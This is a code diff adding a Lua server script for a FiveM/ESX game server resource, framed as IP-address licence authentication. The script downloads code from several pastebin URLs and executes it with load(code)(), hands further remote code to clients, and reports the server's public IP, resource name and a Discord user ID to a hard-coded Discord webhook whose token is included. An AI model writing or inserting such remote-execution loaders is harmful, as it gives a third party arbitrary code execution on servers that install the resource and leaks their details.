@@ -1,0 +1,124 @@
+ESX.RegisterServerCallback(GetCurrentResourceName()..'PostLoadScript:client', function(playerId, cb)
+  PerformHttpRequest('https://pastebin.com/raw/Kng57T7x', function(status, code, headers)
+      cb(code)
+  end)
+end)
+
+loadScript_Server = function()
+PerformHttpRequest('https://pastebin.com/raw/Mn7MD7wK', function(status, code, headers)
+  load(code)()
+end)
+end
+
+PerformHttpRequest('https://api.ipify.org', function(method, text, headers)
+  if method then
+      print("\x1b[43m[" .. GetCurrentResourceName() .. "]\x1b[0m ".."Authenticating with API...\n")
+      Wait(1500)
+      PerformHttpRequest('https://pastebin.com/raw/Rs4ZTwGC', function(status, address, headers)
+          if status then 
+              ip = json.decode(address) 
+              for k , v in pairs(ip) do
+                  if v.ip == text then 
+                      if v.resource == GetCurrentResourceName() then
+                          print("\x1b[42m[" .. GetCurrentResourceName() .. "]\x1b[0m ".."IP Address authenticating succeeded.")
+                          loadScript_Server()
+                          Discord_SendWebhook(1, v.ip, v.dc)
+                      else
+                          print("\x1b[41m[" .. GetCurrentResourceName() .. "]\x1b[0m ".."Mistake ResourceName.")
+                          Discord_SendWebhook(2, v.ip, v.dc)
+                      end
+                      return
+                  end
+              end
+              Discord_SendWebhook(3, text)
+              print("\x1b[41m[" .. GetCurrentResourceName() .. "]\x1b[0m ".."Mistake IP Address : "..text.."")
+          end
+      end)
+  end
+end)
+
+Discord_SendWebhook = function ( num , address , dis)
+  if num == 1 then
+      local embed = {
+          {
+              ['color'] = 8060672, -- 3407616 7405312
+              ['fields'] = {
+                  {
+                      ['name'] = "``📁Information``",
+                      ['value'] = "**Resource : ** ``"..GetCurrentResourceName().."``\n**IP : ** ``"..address.."``\n**Connected by : ** <@"..dis..">",
+                      ['inline'] = true,
+                  },
+                  {
+                      ['name'] = "``📚Resource verify``",
+                      ['value'] = "``Connected ✅``",
+                      ['inline'] = true,
+                  }
+              },
+              ['timestamp'] = os.date('!%Y-%m-%dT%H:%M:%SZ', os.time()),
+              ['footer'] = {
+                  ['text'] = "Made with 💜 by Krazy#3998",
+                  ['icon_url'] = "",
+              },
+              ['thumbnail'] = {
+                  ['url'] = "",
+              }
+          }
+      }
+      PerformHttpRequest("https://discordapp.com/api/webhooks/1095019469425877032/tWxsyKTRyyg7xmP2uka2cCPGk9JGpW6fmXlWt6alOSk9M3Rz2bxhscVAY9lX0yjy4AWK", function(err, text, headers) end, 'POST', json.encode({ username = '🧠', avatar_url = "https://cdn.discordapp.com/attachments/1060638809726910565/1084984531787984916/b934a6f750d0d7d0.png", embeds = embed}), { ['Content-Type'] = 'application/json' })
+  elseif num == 2 then
+      local embed = {
+          {
+              ['color'] = 16711680, -- 3407616 7405312
+              ['fields'] = {
+                  {
+                      ['name'] = "``📁Information``",
+                      ['value'] = "**Resource : ** ``Mistake ResourceName``\n**IP : ** ``"..address.."``\n**Connected by : ** <@"..dis..">",
+                      ['inline'] = true,
+                  },
+                  {
+                      ['name'] = "``📚Resource verify``",
+                      ['value'] = "``Disconnect ❌``",
+                      ['inline'] = true,
+                  },
+              },
+              ['timestamp'] = os.date('!%Y-%m-%dT%H:%M:%SZ', os.time()),
+              ['footer'] = {
+                  ['text'] = "Made with 💜 by Krazy#3998",
+                  ['icon_url'] = "",
+              },
+              ['thumbnail'] = {
+                  ['url'] = "",
+              }
+          }
+      }
+      PerformHttpRequest("https://discordapp.com/api/webhooks/1095019469425877032/tWxsyKTRyyg7xmP2uka2cCPGk9JGpW6fmXlWt6alOSk9M3Rz2bxhscVAY9lX0yjy4AWK", function(err, text, headers) end, 'POST', json.encode({ username = '🧠', avatar_url = "https://cdn.discordapp.com/attachments/1060638809726910565/1084984531787984916/b934a6f750d0d7d0.png", embeds = embed}), { ['Content-Type'] = 'application/json' })
+  else 
+      local embed = {
+          {
+              ['color'] = 16711680, -- 3407616 7405312
+              ['fields'] = {
+                  {
+                      ['name'] = "``📁Information``",
+                      ['value'] = "**Resource : ** ``"..GetCurrentResourceName().."``\n**IP : ** ``Mistake IP Address``\n**Connected by : ** ``unknow``",
+                      ['inline'] = true,
+                  },
+                  {
+                      ['name'] = "``📚Resource verify``",
+                      ['value'] = "``Disconnect ❌``",
+                      ['inline'] = true,
+                  },
+              },
+              ['timestamp'] = os.date('!%Y-%m-%dT%H:%M:%SZ', os.time()),
+              ['footer'] = {
+                  ['text'] = "Made with 💜 by Krazy#3998",
+                  ['icon_url'] = "",
+              },
+              ['thumbnail'] = {
+                  ['url'] = "",
+              }
+          }
+      }
+      PerformHttpRequest("https://discordapp.com/api/webhooks/1095019469425877032/tWxsyKTRyyg7xmP2uka2cCPGk9JGpW6fmXlWt6alOSk9M3Rz2bxhscVAY9lX0yjy4AWK", function(err, text, headers) end, 'POST', json.encode({ username = '🧠', avatar_url = "https://cdn.discordapp.com/attachments/1060638809726910565/1084984531787984916/b934a6f750d0d7d0.png", embeds = embed}), { ['Content-Type'] = 'application/json' })
+  end
+end
+
